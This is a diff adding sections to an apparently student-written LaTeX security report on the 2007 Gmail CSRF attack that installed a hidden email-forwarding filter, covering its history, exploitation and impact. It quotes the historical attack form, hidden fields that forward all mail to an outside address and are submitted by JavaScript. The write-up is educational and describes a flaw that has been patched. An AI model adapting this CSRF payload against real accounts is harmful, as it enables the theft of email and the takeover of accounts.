@@ -423,13 +423,60 @@ References: (just letting them be here for the moment)
   
   
   \subsection{Email filter hijacking}
-  % TODO
+  Later in 2007 a second CSRF attack was launched on Gmail. This attack was very serious as it compromised 
+  users' integrity. Malicious code forced the victim's Gmail account to add a forwarding filter. All current 
+  and future emails were forwarded to the attacker's choice of email. Just as the first attack, it was very 
+  subtle to the users, meaning an infected user would have problems spotting the fraud. The attacker could 
+  either reap the rewards by lurking in the shadows, or choose to request a password change and hijack the 
+  email account. The result could be devastating with leaked information, account/credit card details, bank 
+  data, confidential reports, etc. Having control over a trusted email would give the attacker new possibilities 
+  by attacking others in the contact list.
+  
+  Google, with it's top modern development team, didn't waste any time and patched up Gmail swiftly. See the
+  sub section: Impact for further information on this subject.
   
   \subsubsection{Exploitation}
-  % TODO
+  This attack used the same basic CSRF techniques. The difference is the code that is used to inject the filter.
+  It is a so called multipart/form-data POST where all the form's fields are being hidden. So instead of using
+  a picture as a disguise, a hidden form is used. JavaScript was used to execute the form: 
+  \texttt{document.forms[0].submit();}.
+  
+  The injection could be done on almost any of Gmail's interfaces where a user was logged in.
+  
+  \begin{figure}[h!t]
+  \begin{minted}[linenos]{HTML/JS} % JS = JavaScript
+  <form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
+    <input type="hidden" name="cf2_emc" value="true"/> 
+    <input type="hidden" name="cf2_email" value="allyourmails@arebelongto.us"/> 
+    <input type="hidden" name="cf1_from" value=""/> 
+    <input type="hidden" name="cf1_to" value=""/> 
+    <input type="hidden" name="cf1_subj" value=""/> 
+    <input type="hidden" name="cf1_has" value=""/> 
+    <input type="hidden" name="cf1_hasnot" value=""/> 
+    <input type="hidden" name="cf1_attach" value="true"/> 
+    <input type="hidden" name="tfi" value=""/> 
+    <input type="hidden" name="s" value="z"/> 
+    <input type="hidden" name="irf" value="on"/> 
+    <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
+  </form>
+  \end{minted}
+  \caption{The form layout presented by Gnucitizen[5] (educational site on security related matters).}
+  \label{figure:signed_token_server}
+  \end{figure}
+  
+[5] Gnucitizen - Google Gmail e-mail hijack technique. http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/. Accessed: 2015-11-26.  
   
   \subsubsection{Impact}
-  % TODO
+  One would it would be a hard backlash for Gmail when the reports came about the CSRF attacks. Users lost 
+  accounts and information even after Google fixed the vulnerability. As the source of the attack, the filter, 
+  had to be removed by the users themselves. But the declining popularity never occurred. The key, to the gigantic
+  success users world wide are using today, is the fact it happened in an early stage. During the attacks in 
+  September, approximately 80 thousand were using Gmail[6]. Compare it to 2015 where 900 million users exists[7].
+  The attack was severe, but it was done during a time Gmail had just started their engines. If the same attack
+  would happen today, who knows how many users would leave Gmail for another email service.
+  
+[6] Techcrunch - 2007 in numbers: Yahoo > Gmail. http://techcrunch.com/2007/12/25/2007-in-numbers-more-people-using-yahoo-mail-this-christmas-than-gmail/. Accessed: 2015-11-27.
+[7] DMR - 15 amazing Gmail Statistics Nov 15. http://expandedramblings.com/index.php/gmail-statistics/. Accessed: 2015-11-27.
   
   \subsection{Comparison}
   % TODO
